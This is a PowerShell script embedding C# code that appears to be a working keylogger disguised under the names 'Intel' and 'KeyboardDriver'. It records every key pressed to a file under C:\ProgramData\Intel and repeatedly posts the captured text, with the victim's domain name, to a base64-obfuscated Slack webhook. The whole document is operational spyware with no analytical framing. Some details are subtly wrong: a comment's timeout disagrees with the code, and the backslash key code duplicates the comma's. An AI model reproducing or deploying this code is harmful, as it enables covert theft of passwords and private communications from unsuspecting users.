Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Text;

public class Intel {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int vKey);

    // Numbers (0-9)
    public const int VK_0 = 0x30;
    public const int VK_1 = 0x31;
    public const int VK_2 = 0x32;
    public const int VK_3 = 0x33;
    public const int VK_4 = 0x34;
    public const int VK_5 = 0x35;
    public const int VK_6 = 0x36;
    public const int VK_7 = 0x37;
    public const int VK_8 = 0x38;
    public const int VK_9 = 0x39;

    // Letters (A-Z)
    public const int VK_A = 0x41;
    public const int VK_B = 0x42;
    public const int VK_C = 0x43;
    public const int VK_D = 0x44;
    public const int VK_E = 0x45;
    public const int VK_F = 0x46;
    public const int VK_G = 0x47;
    public const int VK_H = 0x48;
    public const int VK_I = 0x49;
    public const int VK_J = 0x4A;
    public const int VK_K = 0x4B;
    public const int VK_L = 0x4C;
    public const int VK_M = 0x4D;
    public const int VK_N = 0x4E;
    public const int VK_O = 0x4F;
    public const int VK_P = 0x50;
    public const int VK_Q = 0x51;
    public const int VK_R = 0x52;
    public const int VK_S = 0x53;
    public const int VK_T = 0x54;
    public const int VK_U = 0x55;
    public const int VK_V = 0x56;
    public const int VK_W = 0x57;
    public const int VK_X = 0x58;
    public const int VK_Y = 0x59;
    public const int VK_Z = 0x5A;

    // Special Characters
    public const int VK_SPACE = 0x20;  // Space
    public const int VK_ENTER = 0x0D;  // Enter
    public const int VK_ESCAPE = 0x1B; // Escape
    public const int VK_TAB = 0x09;    // Tab
    public const int VK_SHIFT = 0x10;  // Shift
    public const int VK_CTRL = 0x11;   // Ctrl
    public const int VK_ALT = 0x12;    // Alt
    public const int VK_CAPITAL = 0x14; // Caps Lock
    public const int VK_NUMLOCK = 0x90; // Num Lock
    public const int VK_SCROLL = 0x91; // Scroll Lock

    // Function keys (F1 to F12)
    public const int VK_F1 = 0x70;
    public const int VK_F2 = 0x71;
    public const int VK_F3 = 0x72;
    public const int VK_F4 = 0x73;
    public const int VK_F5 = 0x74;
    public const int VK_F6 = 0x75;
    public const int VK_F7 = 0x76;
    public const int VK_F8 = 0x77;
    public const int VK_F9 = 0x78;
    public const int VK_F10 = 0x79;
    public const int VK_F11 = 0x7A;
    public const int VK_F12 = 0x7B;

    // Punctuation and other symbols
    public const int VK_COMMA = 0xBC;  // Comma (,)
    public const int VK_PERIOD = 0xBE; // Period (.)
    public const int VK_SLASH = 0xBF;  // Slash (/)
    public const int VK_SEMICOLON = 0xBA; // Semicolon (;)
    public const int VK_MINUS = 0xBD;  // Minus (-)
    public const int VK_EQUALS = 0xBB;  // Equals (=)
    public const int VK_TILDE = 0xC0;  // Tilde (~)
    public const int VK_LEFT_BRACKET = 0xDB; // Left Bracket ([)
    public const int VK_RIGHT_BRACKET = 0xDD; // Right Bracket (])
    public const int VK_BACKSLASH = 0xBC;  // Backslash (\)
    public const int VK_QUOTE = 0xDE;  // Quote ()
    
    // Numpad keys
    public const int VK_NUMPAD0 = 0x60;
    public const int VK_NUMPAD1 = 0x61;
    public const int VK_NUMPAD2 = 0x62;
    public const int VK_NUMPAD3 = 0x63;
    public const int VK_NUMPAD4 = 0x64;
    public const int VK_NUMPAD5 = 0x65;
    public const int VK_NUMPAD6 = 0x66;
    public const int VK_NUMPAD7 = 0x67;
    public const int VK_NUMPAD8 = 0x68;
    public const int VK_NUMPAD9 = 0x69;
    public const int VK_NUMPAD_DIVIDE = 0x6F;
    public const int VK_NUMPAD_MULTIPLY = 0x6A;
    public const int VK_NUMPAD_SUBTRACT = 0x6D;
    public const int VK_NUMPAD_ADD = 0x6B;
    public const int VK_NUMPAD_ENTER = 0x8D;
    public const int VK_NUMPAD_DECIMAL = 0x6E;

    public static void KeyboardDriver() {
        string[] keys = new string[] {
            "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", 
            "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", 
            "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", 
            "Space", "Enter", "Escape", "Tab", "Shift", "Ctrl", "Alt", "CapsLock", "NumLock", "ScrollLock", 
            "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12", 
            ",", ".", "/", ";", "-", "=", "~", "[", "]", "\\", "\"",
            "Num0", "Num1", "Num2", "Num3", "Num4", "Num5", "Num6", "Num7", "Num8", "Num9", 
            "NumDivide", "NumMultiply", "NumSubtract", "NumAdd", "NumEnter", "NumDecimal"
        };

        long start = DateTime.Now.Ticks;

        while (true) {
            // Exit after 10 seconds
            if ((DateTime.Now.Ticks - start) / TimeSpan.TicksPerSecond > 30) {
                break;
            }

            for (int i = 0; i < keys.Length; i++) {
                int keyCode = GetVirtualKeyCode(keys[i]);
                if (keyCode != -1 && (GetAsyncKeyState(keyCode) & 0x8000) != 0) {
                    Console.WriteLine(keys[i]);
                    File.AppendAllText("C:\\ProgramData\\Intel\\ok.txt", keys[i], Encoding.UTF8);
                }
            }

            System.Threading.Thread.Sleep(75);
        }
    }

    // Helper method to map key names to virtual key codes
    public static int GetVirtualKeyCode(string keyName) {
        switch (keyName.ToLower()) {
            case "0": return VK_0;
            case "1": return VK_1;
            case "2": return VK_2;
            case "3": return VK_3;
            case "4": return VK_4;
            case "5": return VK_5;
            case "6": return VK_6;
            case "7": return VK_7;
            case "8": return VK_8;
            case "9": return VK_9;
            case "a": return VK_A;
            case "b": return VK_B;
            case "c": return VK_C;
            case "d": return VK_D;
            case "e": return VK_E;
            case "f": return VK_F;
            case "g": return VK_G;
            case "h": return VK_H;
            case "i": return VK_I;
            case "j": return VK_J;
            case "k": return VK_K;
            case "l": return VK_L;
            case "m": return VK_M;
            case "n": return VK_N;
            case "o": return VK_O;
            case "p": return VK_P;
            case "q": return VK_Q;
            case "r": return VK_R;
            case "s": return VK_S;
            case "t": return VK_T;
            case "u": return VK_U;
            case "v": return VK_V;
            case "w": return VK_W;
            case "x": return VK_X;
            case "y": return VK_Y;
            case "z": return VK_Z;
            case "space": return VK_SPACE;
            case "enter": return VK_ENTER;
            case "escape": return VK_ESCAPE;
            case "tab": return VK_TAB;
            case "shift": return VK_SHIFT;
            case "ctrl": return VK_CTRL;
            case "alt": return VK_ALT;
            case "capslock": return VK_CAPITAL;
            case "numlock": return VK_NUMLOCK;
            case "scrolllock": return VK_SCROLL;
            case "f1": return VK_F1;
            case "f2": return VK_F2;
            case "f3": return VK_F3;
            case "f4": return VK_F4;
            case "f5": return VK_F5;
            case "f6": return VK_F6;
            case "f7": return VK_F7;
            case "f8": return VK_F8;
            case "f9": return VK_F9;
            case "f10": return VK_F10;
            case "f11": return VK_F11;
            case "f12": return VK_F12;
            case ",": return VK_COMMA;
            case ".": return VK_PERIOD;
            case "/": return VK_SLASH;
            case ";": return VK_SEMICOLON;
            case "-": return VK_MINUS;
            case "=": return VK_EQUALS;
            case "~": return VK_TILDE;
            case "[": return VK_LEFT_BRACKET;
            case "]": return VK_RIGHT_BRACKET;
            case "\\": return VK_BACKSLASH;
            case "\"": return VK_QUOTE;
            case "num0": return VK_NUMPAD0;
            case "num1": return VK_NUMPAD1;
            case "num2": return VK_NUMPAD2;
            case "num3": return VK_NUMPAD3;
            case "num4": return VK_NUMPAD4;
            case "num5": return VK_NUMPAD5;
            case "num6": return VK_NUMPAD6;
            case "num7": return VK_NUMPAD7;
            case "num8": return VK_NUMPAD8;
            case "num9": return VK_NUMPAD9;
            case "numdivide": return VK_NUMPAD_DIVIDE;
            case "nummultiply": return VK_NUMPAD_MULTIPLY;
            case "numsubtract": return VK_NUMPAD_SUBTRACT;
            case "numadd": return VK_NUMPAD_ADD;
            case "numenter": return VK_NUMPAD_ENTER;
            case "numdecimal": return VK_NUMPAD_DECIMAL;
            default: return -1; // Invalid key name
        }
    }
}
"@
$UR = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDA4NlBVNkVIRUcvQjA4NlJUV1FESzQvclpGckczYVpFa3FSNWl6YWpYTEdLVjR2"))
while ($true) {
    [Intel]::KeyboardDriver();
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $content = Get-Content "C:\ProgramData\Intel\ok.txt"
    $res = Invoke-WebRequest -Uri $UR `
        -Method Post `
        -ContentType "application/json" `
        -Body "{`"text`":`"$ENV:USERDOMAIN\t$timestamp\n$content`"}"
    Set-Content "C:\ProgramData\Intel\ok.txt" " "
}